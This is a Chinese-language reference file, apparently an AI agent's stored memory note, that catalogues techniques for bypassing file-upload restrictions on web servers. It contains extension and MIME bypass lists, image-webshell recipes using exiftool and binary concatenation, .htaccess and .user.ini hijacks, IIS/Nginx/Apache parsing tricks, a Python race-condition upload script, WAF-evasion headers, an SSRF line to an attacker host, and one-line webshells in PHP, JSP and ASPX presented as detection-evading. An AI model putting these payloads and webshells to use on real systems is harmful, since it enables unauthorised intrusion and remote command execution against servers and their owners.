---
name: kb_file_upload_bypass_2026
description: 文件上传绕过技术大全—后缀名绕过/Content-Type绕过/htaccess解析漏洞/Nginx IIS Apache/条件竞争/图片马/二次渲染/编辑器上传
metadata: 
  node_type: memory
  type: reference
  originSessionId: 5d675b98-bcc4-43f6-b8de-46635cd0836f
---

# 文件上传绕过技术大全 (2026版)

## 一、攻击面优先级

### 先判断文件上传后的处理方式
```
Step 1: 上传后返回路径? → 直接访问webshell
Step 2: 上传后只返回ID? → 尝试爆破/拼接/遍历路径
Step 3: 上传后重命名? → 二次渲染绕过/条件竞争
Step 4: 上传到OSS/云存储? → SSRF转向云存储读取
```

---

## 二、后缀名/扩展名绕过 (最常用)

### PHP 环境
```
.php  (正常)
.Php / .pHp / .PHP          # 大小写绕过
.php5 / .phtml /.pht / .phar / .pHp5 / .shtml  # 备用后缀
.php. / .php..               # Windows末尾点绕过
.php . / .php::$DATA         # Windows NTFS流
.php%00.jpg                  # 截断绕过 (<PHP 5.3.4)
.php/.                       # Nginx环境
```

### ASP/ASPX 环境
```
.aspx                       # .NET正常后缀
.asp;.jpg                   # IIS 6.0 分号解析
.asa / .cer / .cdx          # IIS备用后缀都当asp执行
.aspx::$DATA                # NTFS
.asp%00.jpg                 # 截断
shell.aspx.                 # 末尾点
```

### JSP 环境
```
.jsp  / .jspx  / .jspf      # 正常+备选
.jsp/  / .jsp%00            # 截断
.jsp::$DATA                 # NTFS
.Jsp / .JSP                 # 大小写
```

### Java/WAR 环境
```
.war / .jar / .ear          # 直接部署WAR
.zip → 解析到webroot
```

---

## 三、Content-Type / MIME 绕过

### PHP 检测绕过
```bash
# burp改 Content-Type
Content-Type: image/jpeg   # 原本校验的
Content-Type: image/gif
Content-Type: image/png

# 图片马 + 正确 Content-Type 一起过
```

### 多文件上传绕过(只校验第一个)
```
POST /upload
Content-Type: multipart/form-data; boundary=xxx

file1 = real.jpg (Content-Type: image/jpeg)  → 校验通过
file2 = shell.php  (Content-Type: application/octet-stream) → 绕过
```

---

## 四、图片马 (绕过内容校验)

### GIF89a + PHP
```
GIF89a
<?php system($_GET['cmd']); ?>
```

### PNG 图片马
```bash
# 制作
copy /b real.png + shell.php shell.png

# 或 hexdump 插入payload
xxd -p shell.png | head -1
# 在文件开始后插入 <?php 代码
```

### JPG 图片马
```bash
# exiftool 注EXIF
exiftool -Comment='<?php system($_GET["cmd"]);?>' real.jpg -o shell.jpg

# 或直接用二进制拼接
copy /b real.jpg + shell.php shell.jpg
```

### 图片马触发的必要条件
- **本地文件包含**: `include('uploads/shell.jpg')`
- **Nginx 解析漏洞**: `shell.jpg/1.php`
- **IIS 解析漏洞**: 同目录图片马
- **.htaccess 配合**: AddType application/x-httpd-php .jpg

---

## 五、.htaccess 绕过 (Apache)

### 自定义后缀解析为PHP
```
# 上传 .htaccess
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .htaccess   # 自己也是webshell

# 然后上传图片马 shell.jpg → 当PHP执行
```

### .htaccess 被过滤的绕过
```
# 带BOM的.htaccess
# Windows下 .htaccess. / .htaccess::$DATA
# 无扩展名: 设置为application/x-httpd-php
```

### 利用 SetHandler
```
SetHandler application/x-httpd-php
# 该目录下所有文件当PHP执行
```

---

## 六、.user.ini 绕过 (Nginx+PHP-FPM/Apache+mod_fastcgi)

### user.ini 特性
```ini
# 上传 .user.ini 到uploads目录
auto_prepend_file = shell.jpg    # 所有PHP请求前先include shell.jpg
auto_append_file  = shell.jpg    # 所有PHP请求后include shell.jpg

# 然后访问该目录下任何已存在的PHP文件→图片马被执行
```

### 等待生效
- user.ini 300秒刷新一次
- PHP-FPM 需 reload 或等缓存过期

---

## 七、服务器解析漏洞

### Nginx 解析漏洞
```
# 配置不当 (cgi.fix_pathinfo=1)
/upload/shell.jpg/1.php     → 把.jpg当PHP执行
/upload/shell.jpg%00.php    → 截断
/upload/1.jpg/../1.php      → 目录穿越解析
```

### IIS 6.0 解析漏洞
```
/upload/1.asp;.jpg          → 分号后面不检查，当asp执行
/upload/1.asp/1.jpg         → 目录名含.asp，目录下图片都当asp执行
/upload/1.cer               → .cer 当asp执行
```

### IIS 7.x 解析漏洞
```
/upload/shell.jpg/.php      → FastCGI解析漏洞→jpeg当php
```

### Apache 解析漏洞
```
shell.php.xxx               → 从右往左找已知扩展名，.php命中
shell.php::$DATA            → NTFS流
```

---

## 八、截断绕过

### %00 截断 (< PHP 5.3.4)
```
# URL中
filename=shell.php%00.jpg

# POST body中 (需手动编辑hex)
filename=shell.php[0x00].jpg
```

### 超长文件名截断
```
filename=AAAAAA.......(5000个A).php
→ 系统截断 .jpg 去掉，保留 .php
```

### 目录截断
```
filename=shell.php/.
filename=shell.php/   (Content-Disposition 最后不带双引号)
```

---

## 九、条件竞争

### 原理
```
文件先落盘→再检查合法性→不合格删除
中间时间窗口→访问已落盘文件
```

### 攻击流程
```
1. Burp Intruder: 持续POST上传shell.php (多线程)
2. Burp Intruder: 同时持续GET /upload/shell.php
3. 利用时间窗口命中未删除的文件
```

### Python 竞争脚本
```python
import threading, requests

def upload():
    while True:
        requests.post(url, files={'file':('shell.php','<?php system("id");?>')})

def access():
    while True:
        r = requests.get(url+'/shell.php')
        if 'uid=' in r.text:
            print('GOT SHELL!')

threading.Thread(target=upload).start()
threading.Thread(target=access).start()
```

---

## 十、二次渲染绕过

### 原理
上传图片→服务端 `getimagesize()` / `imagecreatefromjpeg()` 重新生成→图片马payload被破坏

### GIF 二次渲染绕过 (最稳定)
```
1. 取正常GIF图片
2. 用010 Editor找到图片数据区(gif很少改这部分)
3. 在数据区插入 <?=system($_GET[1]);?>
4. 上传→二次渲染→payload还在
```

### PNG 二次渲染绕过
```php
<?php
$p = array(0xa3, 0x9f, 0x67, ...); // IDAT改写技术
// 需要专门工具绕过PNG重压缩
```

### JPG 二次渲染绕过
- 较难，GIF是最稳妥的方式
- 或用exiftool改写EXIF Comment段(部分服务端不重压缩EXIF)

---

## 十一、编辑器上传漏洞

### eWebEditor
- `/ewebeditor/jsp/upload.jsp` → 未授权
- 路径穿越: `sCusDir=../../../`
- 远程抓取: `action=remote` + SSRF
- 默认密码: `admin/admin`

### CKEditor / CKFinder
- `/ckfinder/connector?command=...`
- connector XML配置可能允许任意后缀

### KindEditor
- `/kindeditor/php/upload_json.php?dir=file`
- 历史版本路径穿越

### FCKeditor
- `/fckeditor/editor/filemanager/connectors/` 多语言上传
- 2.6.x 版本 `upload.asp` → .cer绕过

### UEditor
- `/ueditor/php/controller.php?action=uploadfile`
- `config.json` 中配置允许的后缀可控
- 远程抓图SSRF: `?action=catchimage&source[]=http://attacker/`

---

## 十二、WAF 绕过

### 通用 WAF 绕过 payload
```
# Content-Disposition 混淆
filename="shell.php"              → 正常
filename=shell.php                → 无引号
filename="shell.php               → 无闭合引号
filename='shell.php'              → 单引号
filename=shell.php;.jpg           → 分号
filename="shell.pHp"              → 大小写
Content-Disposition: form-data; name="file"; filename="shell.php"  # 多分号

# 多 Content-Disposition 头 (取最后一个)
Content-Disposition: form-data; name="file"; filename="safe.jpg"
Content-Disposition: form-data; name="file"; filename="shell.php"

# filename 换 name 字段
name="shell.php"

# multipart boundary 混淆
# boundary中插入特殊字符
```

### 文件内容 WAF 绕过
```
# PHP 短标签(php.ini short_open_tag=On)
<?=system($_GET['cmd'])?>

# script标签
<script language="php">system($_GET['cmd']);</script>

# asp代码
<% @ Page Language="Jscript" %><% eval(Request("cmd"),"unsafe");%>
```

---

## 十三、检测文件上传类型的技巧

```
Step 1: 传正常图片 → 看返回路径→确定上传目录
Step 2: 传 .php → 看拦截信息→确定黑名单/白名单
Step 3: 传 .php5/.phtml → 看是否放过
Step 4: 传 .htaccess → 看是否允许覆盖
Step 5: 传图片马 → 看返回大小→判断是否二次渲染
Step 6: 条件竞争 → 多线程拼速度
```

---

## 十四、Webshell 一句话内存版 (免杀)

### PHP
```php
<?=@eval($_POST[1]);?>       # 最短
<?=`$_GET[1]`;?>             # 最短命令执行
<?php system($_GET['c']);?>  # PHP 7.4+ 不支持短标签
```

### JSP
```jsp
<%Runtime.getRuntime().exec(request.getParameter("c"));%>
<%! class U extends ClassLoader {U(ClassLoader c) {super(c);}public Class g(byte[] b) {return super.defineClass(b,0,b.length);}}%>
<%=new U(this.getClass().getClassLoader()).g(request.getParameter("c").getBytes()).newInstance().equals(pageContext)%>
```

### ASPX
```aspx
<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c "+Request["c"]);%>
```